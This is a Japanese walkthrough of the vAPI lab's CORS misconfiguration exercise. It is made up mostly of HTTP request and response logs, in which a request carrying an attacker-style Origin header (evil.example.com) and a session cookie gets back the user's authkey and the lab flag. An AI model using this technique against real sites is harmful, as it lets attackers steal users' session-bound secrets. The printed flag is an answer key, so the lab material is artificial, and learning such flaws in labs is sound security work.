## API7 Security Misconfiguration
APIの代表的な設定ミス（考慮不足）にクロスオリジンリクエストがある。

Create User、User Login、Get Keyまでを一通り実行する。
```http
POST /vapi/api7/user HTTP/1.1
Content-Type: application/json
User-Agent: PostmanRuntime/7.29.0
Accept: */*
Postman-Token: 5b7c816d-0b7b-41ea-a8bc-15e853651d4a
Host: localhost
Accept-Encoding: gzip, deflate
Connection: close
Content-Length: 43

{
    "username":"",
    "password":""
}
```
```http
HTTP/1.1 200 OK
Host: localhost
Date: Sat, 05 Mar 2022 14:19:18 GMT
Connection: close
X-Powered-By: PHP/7.4.7
Cache-Control: no-cache, private
Date: Sat, 05 Mar 2022 14:19:18 GMT
Content-Type: application/json

{"username":"","password":"","id":2}
```
```http
GET /vapi/api7/user/login HTTP/1.1
Authorization-Token: Og==
Content-Type: application/json
User-Agent: PostmanRuntime/7.29.0
Accept: */*
Postman-Token: f2e08a19-d93e-49e3-9cbb-a5e5772a20e9
Host: localhost
Accept-Encoding: gzip, deflate
Connection: close

```
```http
HTTP/1.1 200 OK
Host: localhost
Date: Sat, 05 Mar 2022 14:19:24 GMT
Connection: close
X-Powered-By: PHP/7.4.7
Set-Cookie: PHPSESSID=1d146ce6c7cda9305cf082f33a671aeb; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Cache-Control: no-cache, private
Date: Sat, 05 Mar 2022 14:19:24 GMT
Content-Type: application/json

{"success":"true","msg":"User logged in"}
```
```http
GET /vapi/api7/user/key HTTP/1.1
Content-Type: application/json
User-Agent: PostmanRuntime/7.29.0
Accept: */*
Postman-Token: 0af00dc1-57a5-4e80-ad75-d9a8da85dba8
Host: localhost
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=1d146ce6c7cda9305cf082f33a671aeb

```
```http
HTTP/1.1 200 OK
Host: localhost
Date: Sat, 05 Mar 2022 14:19:50 GMT
Connection: close
X-Powered-By: PHP/7.4.7
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Cache-Control: no-cache, private
Date: Sat, 05 Mar 2022 14:19:50 GMT
Content-Type: application/json
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true

{"id":2,"username":"","password":"","authkey":"b74a95481864f4ae732518cb28756918d95b5fffb1e0bea806aa33692405feed"}
```

最後のGet KeyのAPIをよく見ると`Access-Control-Allow-Origin: *`で、すべてのオリジンからのリクエストを受け入れることが分かる。  
また、`Access-Control-Allow-Credentials: true`もついている。  
このリクエストはPHPSESSIDをもとにKeyを返しているので、攻撃者のサイトから当該サイトへのリクエストでもCookieさえ飛べばKeyが返ってくるはず。

罠サイトからGetリクエストが飛んだことを想定し、`Origin`ヘッダを付加してリクエストしてみる。
```http
GET /vapi/api7/user/key HTTP/1.1
Content-Type: application/json
User-Agent: PostmanRuntime/7.29.0
Accept: */*
Postman-Token: 0af00dc1-57a5-4e80-ad75-d9a8da85dba8
Host: localhost
Origin: evil.example.com
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=1d146ce6c7cda9305cf082f33a671aeb

```
```http
HTTP/1.1 200 OK
Host: localhost
Date: Sat, 05 Mar 2022 14:20:30 GMT
Connection: close
X-Powered-By: PHP/7.4.7
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Cache-Control: no-cache, private
Date: Sat, 05 Mar 2022 14:20:30 GMT
Content-Type: application/json
Access-Control-Allow-Origin: evil.example.com
Access-Control-Allow-Credentials: true

{"flag":"flag{api7_e71b65071645e24ed50a}","user":{"id":2,"username":"","password":"","authkey":"b74a95481864f4ae732518cb28756918d95b5fffb1e0bea806aa33692405feed"}}
```
